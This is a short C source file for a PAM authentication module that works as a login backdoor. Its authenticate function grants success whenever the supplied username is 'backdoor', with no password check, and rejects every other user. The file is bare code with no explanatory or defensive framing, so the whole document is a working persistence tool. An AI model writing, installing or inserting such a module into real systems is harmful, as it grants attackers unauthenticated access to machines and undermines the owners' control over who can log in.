#include <string.h>
#include <syslog.h>
#include <stdio.h>
#define PAM_SM_AUTH
#include <security/pam_modules.h>

PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
    return PAM_SUCCESS ;
}

PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
    int retval;
    const char* pUsername;
    retval = pam_get_user(pamh, (char **)&pUsername, "TUsername: ");
    if (retval != PAM_SUCCESS) {
        return retval;
    }
    if (strcmp(pUsername, "backdoor") != 0) {
        return PAM_AUTH_ERR;
    }
    return PAM_SUCCESS;
}
